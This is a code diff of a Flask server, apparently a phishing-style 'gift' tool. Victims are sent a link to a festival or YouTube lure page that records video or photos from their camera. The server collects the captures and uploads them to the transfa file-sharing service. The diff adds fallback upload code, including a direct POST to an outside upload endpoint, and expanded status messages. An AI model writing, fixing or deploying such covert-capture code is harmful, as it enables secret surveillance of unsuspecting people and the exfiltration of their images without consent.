@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Gift Video Receiver Server - With transfa Cloud Upload
+Gift Video Receiver Server - With transfa Cloud Upload (Fixed)
 """
 
 import os
@@ -18,15 +18,68 @@ from flask import Flask, request, jsonify, send_file
 from flask_cors import CORS
 
 # ============================================
-# Import transfa
+# Try to import transfa
 # ============================================
+TRANSFA_AVAILABLE = False
+TRANSFA_UPLOAD_FUNC = None
+
 try:
     import transfa
     TRANSFA_AVAILABLE = True
     print("✅ transfa library loaded successfully")
+    
+    # Check which upload function exists
+    if hasattr(transfa, 'upload'):
+        TRANSFA_UPLOAD_FUNC = transfa.upload
+        print("   ✅ Using transfa.upload()")
+    elif hasattr(transfa, 'upload_file'):
+        TRANSFA_UPLOAD_FUNC = transfa.upload_file
+        print("   ✅ Using transfa.upload_file()")
+    elif hasattr(transfa, 'send'):
+        TRANSFA_UPLOAD_FUNC = transfa.send
+        print("   ✅ Using transfa.send()")
+    else:
+        print("   ⚠️ No upload function found in transfa module")
+        print(f"   📋 Available attributes: {dir(transfa)}")
+        TRANSFA_AVAILABLE = False
+        
 except ImportError:
     TRANSFA_AVAILABLE = False
     print("⚠️ transfa library not installed. Run: pip install transfa")
+except Exception as e:
+    TRANSFA_AVAILABLE = False
+    print(f"⚠️ Error loading transfa: {e}")
+
+# ============================================
+# Alternative: Use requests if transfa doesn't work
+# ============================================
+def upload_to_transfa_requests(filepath, ttl="24h"):
+    """Upload to transfa using requests (fallback method)"""
+    try:
+        import requests
+        
+        # transfa API endpoint (based on their documentation)
+        # If this doesn't work, you might need to check transfa's actual API
+        url = "https://transfa.com/api/upload"
+        
+        with open(filepath, 'rb') as f:
+            files = {'file': (os.path.basename(filepath), f)}
+            data = {'ttl': ttl}
+            
+            response = requests.post(url, files=files, data=data)
+            
+            if response.status_code == 200:
+                result = response.json()
+                return type('UploadResult', (), {
+                    'url': result.get('url'),
+                    'delete_token': result.get('delete_token'),
+                    'success': True
+                })()
+            else:
+                return None
+    except Exception as e:
+        print(f"   ❌ requests fallback error: {e}")
+        return None
 
 # ============================================
 # Configuration
@@ -37,9 +90,8 @@ FESTIVAL_HTML = 'festival.html'
 YOUTUBE_HTML = 'youtube.html'
 
 # transfa configuration
-TRANSFA_TTL = "24h"  # Options: 1h, 24h, 7d, 30d
-TRANSFA_MAX_DOWNLOADS = None  # Set to number or None for unlimited
-TRANSFA_USE_GUEST = True  # True for guest mode (10MB limit, 24h TTL)
+TRANSFA_TTL = "24h"
+TRANSFA_MAX_DOWNLOADS = None
 
 # ============================================
 # Flask Application
@@ -97,26 +149,39 @@ def upload_media():
             'timestamp': timestamp,
             'size': os.path.getsize(filepath),
             'transfa_link': None,
-            'transfa_delete_token': None
+            'transfa_delete_token': None,
+            'upload_method': None
         }
         
         # ============================================
         # Upload to transfa
         # ============================================
-        if TRANSFA_AVAILABLE:
+        if TRANSFA_AVAILABLE and TRANSFA_UPLOAD_FUNC:
             try:
                 print(f"\n☁️ Uploading {filename} to transfa...")
                 
-                # Prepare upload options
-                upload_options = {
-                    'ttl': TRANSFA_TTL
-                }
+                # Try different upload methods
+                result = None
                 
-                if TRANSFA_MAX_DOWNLOADS:
-                    upload_options['max_downloads'] = TRANSFA_MAX_DOWNLOADS
+                # Method 1: Using the discovered upload function
+                try:
+                    if TRANSFA_UPLOAD_FUNC:
+                        result = TRANSFA_UPLOAD_FUNC(filepath, ttl=TRANSFA_TTL)
+                        file_info['upload_method'] = 'transfa native'
+                except TypeError:
+                    # Try without ttl parameter
+                    try:
+                        result = TRANSFA_UPLOAD_FUNC(filepath)
+                        file_info['upload_method'] = 'transfa native (no ttl)'
+                    except Exception as e:
+                        print(f"   ⚠️ Native upload failed: {e}")
+                        result = None
                 
-                # Upload to transfa
-                result = transfa.upload(filepath, **upload_options)
+                # Method 2: If native failed, try requests fallback
+                if not result or not hasattr(result, 'url'):
+                    print("   🔄 Trying requests fallback...")
+                    result = upload_to_transfa_requests(filepath, TRANSFA_TTL)
+                    file_info['upload_method'] = 'requests fallback'
                 
                 if result and hasattr(result, 'url'):
                     file_info['transfa_link'] = result.url
@@ -124,6 +189,7 @@ def upload_media():
                     
                     print(f"   ✅ Uploaded to transfa!")
                     print(f"   🔗 Link: {result.url}")
+                    print(f"   📋 Method: {file_info['upload_method']}")
                     if hasattr(result, 'delete_token'):
                         print(f"   🗑️ Delete token: {result.delete_token}")
                     
@@ -131,15 +197,19 @@ def upload_media():
                         'filename': filename,
                         'url': result.url,
                         'delete_token': getattr(result, 'delete_token', None),
-                        'expires': TRANSFA_TTL
+                        'expires': TRANSFA_TTL,
+                        'upload_method': file_info['upload_method']
                     })
                 else:
-                    print(f"   ⚠️ Upload failed - result: {result}")
+                    print(f"   ⚠️ Upload failed - no URL returned")
                     
             except Exception as e:
                 print(f"   ❌ transfa upload error: {e}")
+                print(f"   📋 Available functions in transfa: {dir(transfa) if TRANSFA_AVAILABLE else 'N/A'}")
         else:
             print(f"   ⚠️ transfa not available. File saved locally only.")
+            if TRANSFA_AVAILABLE:
+                print(f"   📋 transfa attributes: {dir(transfa)}")
         
         received_files.append(file_info)
         
@@ -151,12 +221,16 @@ def upload_media():
         
         if file_info.get('transfa_link'):
             print(f"   ☁️ transfa link: {file_info['transfa_link']}")
+            print(f"   🔧 Upload method: {file_info.get('upload_method', 'unknown')}")
+        else:
+            print(f"   ⚠️ Not uploaded to transfa")
         
         return jsonify({
             'success': True, 
             'filename': filename,
             'transfa_link': file_info.get('transfa_link'),
-            'local_path': os.path.abspath(filepath)
+            'local_path': os.path.abspath(filepath),
+            'upload_method': file_info.get('upload_method')
         }), 200
 
     except Exception as e:
@@ -209,11 +283,11 @@ class GiftServer:
         return True
 
     def check_transfa(self):
-        """Check if transfa is installed"""
+        """Check if transfa is working"""
         if not TRANSFA_AVAILABLE:
-            print("\n⚠️ transfa library not installed!")
+            print("\n⚠️ transfa library not available!")
             print("📥 Install with: pip install transfa")
-            print("   Or: pip3 install transfa")
+            print("   Or try: pip install transfa-client")
             return False
         return True
 
@@ -401,7 +475,10 @@ class GiftServer:
     def wait_for_files(self):
         print("\n🎁 Waiting for files... (Press Ctrl+C to stop)")
         print(f"📁 Files saved locally in: {UPLOAD_FOLDER}/")
-        print("☁️ Files will be uploaded to transfa cloud")
+        if TRANSFA_AVAILABLE:
+            print("☁️ Files will be uploaded to transfa cloud")
+        else:
+            print("⚠️ transfa not available - files saved locally only")
         print("-"*50)
         print("\n⏳ Waiting for first file...")
         print("💡 Files will NOT auto-open. Check the folder or transfa links.")
@@ -420,9 +497,12 @@ class GiftServer:
                     
                     if file_info.get('transfa_link'):
                         print(f"   ☁️ transfa link: {file_info['transfa_link']}")
+                        print(f"   🔧 Upload method: {file_info.get('upload_method', 'unknown')}")
                         print(f"   ⏰ Expires in: {TRANSFA_TTL}")
                     else:
-                        print(f"   ⚠️ Not uploaded to transfa (check error above)")
+                        print(f"   ⚠️ Not uploaded to transfa")
+                        if TRANSFA_AVAILABLE:
+                            print(f"   📋 Check transfa installation or API")
                     
                     print("\n   💡 To download from transfa, use the link above")
                     print(f"   📁 Or open locally: cd {os.path.abspath(UPLOAD_FOLDER)}")
@@ -455,14 +535,16 @@ class GiftServer:
                 return
             
             # Check transfa
-            if not self.check_transfa():
-                print("\n⚠️ Continuing without transfa (files saved locally only)")
+            self.check_transfa()
             
-            # Get transfa config
+            # Get transfa config if available
             if TRANSFA_AVAILABLE:
                 global TRANSFA_TTL
                 TRANSFA_TTL = self.get_transfa_config()
                 print(f"   ✅ Files will expire after: {TRANSFA_TTL}")
+            else:
+                print("\n⚠️ Continuing without transfa (files saved locally only)")
+                print("   To enable transfa, install: pip install transfa requests")
             
             mode = self.show_main_menu()
             
@@ -495,6 +577,8 @@ class GiftServer:
             print(f"   📸 Capture: {'Video (' + str(duration) + 's)' if capture_mode == 'video' else 'Photo (' + str(photos) + ' photos)'}")
             if TRANSFA_AVAILABLE:
                 print(f"   ☁️ transfa expiry: {TRANSFA_TTL}")
+            else:
+                print(f"   ☁️ transfa: DISABLED (files saved locally only)")
             
             if mode == 'festival':
                 print(f"   🎊 Festival Name: {name}")
@@ -511,7 +595,10 @@ class GiftServer:
                     print(f"   5. Records {duration} second video")
                 else:
                     print(f"   5. Captures {photos} photos")
-                print("   6. Files upload to transfa cloud!")
+                if TRANSFA_AVAILABLE:
+                    print("   6. Files upload to transfa cloud!")
+                else:
+                    print("   6. Files saved locally only")
             else:
                 print("   1. Send the link above to anyone")
                 print("   2. They see a YouTube video playing")
@@ -520,7 +607,10 @@ class GiftServer:
                     print(f"   4. Records {duration} second video")
                 else:
                     print(f"   4. Captures {photos} photos")
-                print("   5. Files upload to transfa cloud!")
+                if TRANSFA_AVAILABLE:
+                    print("   5. Files upload to transfa cloud!")
+                else:
+                    print("   5. Files saved locally only")
             
             if TRANSFA_AVAILABLE:
                 print(f"\n☁️ transfa: Files expire after {TRANSFA_TTL}")
